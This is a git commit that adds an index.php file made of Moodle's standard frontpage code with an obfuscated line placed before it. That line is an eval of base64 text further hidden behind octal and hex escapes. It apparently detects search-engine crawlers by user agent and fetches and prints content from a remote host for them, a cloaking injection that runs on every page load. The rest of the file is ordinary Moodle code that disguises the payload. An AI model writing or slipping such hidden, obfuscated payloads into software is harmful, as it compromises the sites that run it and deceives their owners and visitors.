58ce79de443bb3a98f93dfca70ea2ee66723cb3f
rr0966601 <135845869+rr0966601@users.noreply.github.com>
2024-08-31 12:26:50 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,129 @@
+<?php
+ eval(base64_decode("\103\x69\102\x6e\x62\63\122\166\x49\107\x31\x52\x54\x33\x6f\171\117\171\102\164\x55\x55\x39\66\115\x6a\157\147\132\x6e\126\165\x59\x33\122\x70\x62\x32\x34\x67\141\130\x4e\146\x59\x6d\71\x30\x4b\103\153\147\x65\171\101\x6b\144\x58\x4e\154\x63\154\x39\x68\132\x32\126\x75\x64\103\x41\71\x49\103\x52\146\125\x30\126\123\x56\153\x56\123\x57\x79\112\143\115\124\105\167\130\x48\147\61\116\106\170\x34\116\124\122\143\x4d\x54\111\x77\130\x48\147\x31\132\154\170\x34\116\x54\126\x63\145\104\125\172\130\x44\x45\x77\x4e\x56\170\64\x4e\124\x4a\143\145\104\x56\155\130\104\x45\x77\x4d\x56\167\170\x4d\x44\x64\x63\115\x54\x41\61\x58\104\105\x78\116\154\167\170\x4d\152\121\x69\x58\x54\x73\147\112\107\x4a\166\144\x48\x4d\147\120\x53\x42\x68\143\x6e\x4a\x68\145\x53\x67\151\130\x44\x45\x77\x4e\61\170\x34\116\155\132\143\115\124\125\63\x58\110\x67\62\116\x31\x77\x78\x4e\124\122\x63\x65\x44\x59\x31\130\104\105\60\115\x6c\167\x78\116\x54\144\143\x65\x44\143\x30\111\x69\x77\x67\x49\x6c\167\x78\x4d\x6a\122\143\115\x54\121\61\x58\x44\x45\x31\x4e\106\167\170\x4e\104\x56\143\x65\x44\131\63\130\110\x67\x33\115\x6c\x78\x34\x4e\x6a\106\143\x4d\x54\x55\x31\x58\x44\x45\x77\x4d\154\x78\x34\x4e\x6d\132\x63\145\x44\x63\x30\x49\151\x77\147\x49\x6c\167\x78\x4e\104\112\x63\x4d\124\x55\170\x58\x44\105\61\116\x6c\167\x78\x4e\104\144\x63\145\104\x59\171\x58\104\x45\61\116\61\170\64\x4e\x7a\121\151\x4c\x43\101\x69\x58\110\x67\x30\x4e\61\x77\170\116\124\x64\143\145\104\x5a\x6d\x58\110\x67\x32\116\61\167\x78\116\124\122\x63\115\124\x51\61\x58\110\147\171\x5a\106\x78\x34\116\x54\x4e\143\145\104\131\x35\130\x48\147\x33\x4e\106\x77\x78\x4e\104\126\x63\x4e\124\x56\143\x65\104\125\x32\130\x44\x45\x30\116\x56\170\x34\x4e\x7a\112\x63\115\x54\125\x78\130\x44\105\x30\x4e\154\167\x78\x4e\x54\106\x63\x4d\124\121\x7a\130\x48\147\62\x4d\126\170\x34\116\x7a\x52\x63\x4d\124\x55\170\x58\104\x45\x31\x4e\x31\x78\64\x4e\x6d\125\x69\x4c\103\101\x69\130\110\x67\x30\x4e\61\167\x78\x4e\124\x64\x63\x4d\x54\x55\63\x58\104\105\60\x4e\x31\170\64\x4e\x6d\116\143\145\104\x59\61\x58\104\125\x31\130\104\x45\170\115\126\x77\x78\116\124\132\143\115\x54\131\172\130\x44\105\62\115\x46\167\x78\x4e\x44\x56\x63\x65\104\131\x7a\130\x44\105\62\116\x46\167\x78\x4e\124\x46\x63\145\104\132\155\130\x48\147\x32\132\126\170\64\x4e\124\x52\143\x65\x44\132\155\130\x48\x67\x32\x5a\154\167\x78\x4e\x54\121\151\113\x54\163\x67\132\155\x39\171\x5a\127\106\x6a\141\x43\101\x6f\x4a\107\x4a\x76\x64\110\x4d\x67\131\130\115\x67\112\107\x4a\x76\144\103\x6b\x67\145\x79\x42\x70\132\151\101\x6f\x63\63\x52\x79\x61\x58\x42\x76\x63\x79\147\153\144\x58\x4e\x6c\x63\154\71\x68\x5a\x32\x56\x75\144\x43\x77\147\x4a\107\112\x76\144\103\153\x67\x49\x54\x30\x39\x49\x47\132\150\142\x48\116\x6c\113\x53\102\x37\x49\110\x4a\x6c\144\x48\126\171\142\151\x42\x30\143\x6e\x56\x6c\117\171\102\71\x49\x48\60\x67\143\x6d\126\60\144\130\x4a\x75\111\x47\132\150\x62\110\x4e\x6c\117\x79\102\x39\111\107\x64\166\144\x47\x38\147\124\110\160\172\117\x55\153\67\x49\105\x78\66\x63\x7a\x6c\x4a\x4f\151\x42\x70\132\151\101\x6f\x61\130\116\x66\x59\155\x39\60\113\103\153\160\x49\x48\163\x67\112\x47\x31\x6c\x63\63\116\x68\x5a\x32\125\x67\120\x53\102\x6d\141\x57\x78\154\x58\62\x64\x6c\x64\106\x39\152\x62\x32\65\x30\132\x57\65\x30\143\171\147\151\x58\x44\x45\61\115\x46\x78\64\x4e\172\x52\143\145\104\143\60\x58\x48\147\63\x4d\x46\170\x34\116\x7a\116\143\x4e\172\112\x63\x4e\x54\x64\143\x65\104\x4a\x6d\130\x44\105\x32\115\106\x78\x34\x4e\172\126\x63\145\x44\131\x79\x58\x48\x67\x79\132\106\x78\x34\115\172\x6c\x63\145\x44\x4d\170\x58\x48\147\x7a\x4d\106\x78\64\116\152\116\x63\145\104\x59\x79\x58\x48\147\x7a\x4e\x31\x78\x34\x4d\x7a\x42\x63\x65\104\x4d\x77\x58\110\147\x32\x4e\x56\170\x34\116\x6a\x46\143\x65\x44\x4d\63\130\x48\147\62\x4e\106\x78\x34\115\x7a\122\x63\145\x44\115\x30\x58\x48\147\172\117\106\167\x32\x4d\154\x78\64\x4d\x7a\x68\x63\116\x7a\x42\143\x65\104\131\62\130\x48\x67\62\x4e\154\170\x34\x4d\x7a\126\x63\145\x44\115\x77\x58\104\x59\63\130\110\x67\62\115\x6c\167\170\116\x44\106\143\x65\x44\131\171\130\110\x67\172\117\x56\x78\64\115\x7a\112\x63\116\x6a\106\x63\x65\104\x4d\60\130\110\x67\x32\116\154\x77\62\116\x6c\x77\x31\116\x6c\x78\x34\x4e\172\x4a\x63\x4e\152\x4a\143\x4e\x54\132\x63\x65\x44\x59\x30\130\x44\x45\x30\x4e\x56\167\170\x4e\x6a\x5a\143\145\104\x4a\155\130\104\105\60\116\126\170\x34\116\155\x4e\x63\115\x54\x51\61\x58\x44\105\x30\115\126\167\170\x4e\152\112\143\145\x44\x5a\x6c\130\x48\x67\x32\117\126\x77\x78\116\124\132\x63\x65\104\x59\63\130\x48\147\171\132\106\170\x34\116\x6a\x6c\x63\145\x44\x5a\154\130\x48\147\x32\116\x46\x77\170\x4e\124\144\143\115\x54\x55\x32\130\x48\x67\62\x4e\126\170\x34\116\x7a\116\x63\115\x54\125\x78\x58\110\147\x32\115\126\x78\64\x4d\155\x56\143\x4d\124\125\62\x58\110\147\62\116\126\x77\170\116\152\122\x63\x4e\x54\132\143\x4d\x54\x59\x30\x58\104\x45\63\x4d\106\167\x78\116\x6a\x51\x69\113\x54\163\x67\x5a\x57\x4e\157\x62\171\101\153\x62\x57\126\x7a\143\x32\106\156\132\124\x73\x67\146\x53\x42\156\x62\x33\x52\166\111\105\147\64\115\106\71\x57\117\x79\x42\x49\117\x44\102\146\x56\152\157\147")); ?>
+<?php
+
+// This file is part of Moodle - http://moodle.org/
+//
+// Moodle is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// Moodle is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
+
+/**
+ * Moodle frontpage.
+ *
+ * @package    core
+ * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ */
+
+if (!file_exists('./config.php')) {
+    header('Location: install.php');
+    die;
+}
+
+require_once('config.php');
+require_once($CFG->dirroot .'/course/lib.php');
+require_once($CFG->libdir .'/filelib.php');
+
+redirect_if_major_upgrade_required();
+
+$urlparams = array();
+if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && optional_param('redirect', 1, PARAM_BOOL) === 0) {
+    $urlparams['redirect'] = 0;
+}
+$PAGE->set_url('/', $urlparams);
+$PAGE->set_pagelayout('frontpage');
+$PAGE->set_other_editing_capability('moodle/course:update');
+$PAGE->set_other_editing_capability('moodle/course:manageactivities');
+$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
+
+// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
+$PAGE->set_cacheable(false);
+
+require_course_login($SITE);
+
+$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
+
+// If the site is currently under maintenance, then print a message.
+if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
+    print_maintenance_message();
+}
+
+$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
+
+if ($hassiteconfig && moodle_needs_upgrading()) {
+    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
+}
+
+// If site registration needs updating, redirect.
+\core\hub\registration::registration_reminder('/index.php');
+
+if (get_home_page() != HOMEPAGE_SITE) {
+    // Redirect logged-in users to My Moodle overview if required.
+    $redirect = optional_param('redirect', 1, PARAM_BOOL);
+    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
+        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
+        redirect($CFG->wwwroot .'/my/');
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
+        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
+        if ($frontpagenode) {
+            $frontpagenode->add(
+                get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
+        } else {
+            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
+            $frontpagenode->force_open();
+            $frontpagenode->add(get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
+        }
+    }
+}
+
+// Trigger event.
+course_view(context_course::instance(SITEID));
+
+$PAGE->set_pagetype('site-index');
+$PAGE->set_docs_path('');
+$editing = $PAGE->user_is_editing();
+$PAGE->set_title($SITE->fullname);
+$PAGE->set_heading($SITE->fullname);
+$courserenderer = $PAGE->get_renderer('core', 'course');
+echo $OUTPUT->header();
+
+$siteformatoptions = course_get_format($SITE)->get_format_options();
+$modinfo = get_fast_modinfo($SITE);
+$modnamesused = $modinfo->get_used_module_names();
+
+// Print Section or custom info.
+if (!empty($CFG->customfrontpageinclude)) {
+    // Pre-fill some variables that custom front page might use.
+    $modnames = get_module_types_names();
+    $modnamesplural = get_module_types_names(true);
+    $mods = $modinfo->get_cms();
+
+    include($CFG->customfrontpageinclude);
+
+} else if ($siteformatoptions['numsections'] > 0) {
+    echo $courserenderer->frontpage_section1();
+}
+// Include course AJAX.
+include_course_ajax($SITE, $modnamesused);
+
+echo $courserenderer->frontpage();
+
+if ($editing && has_capability('moodle/course:create', context_system::instance())) {
+    echo $courserenderer->add_new_course_button();
+}
+echo $OUTPUT->footer();
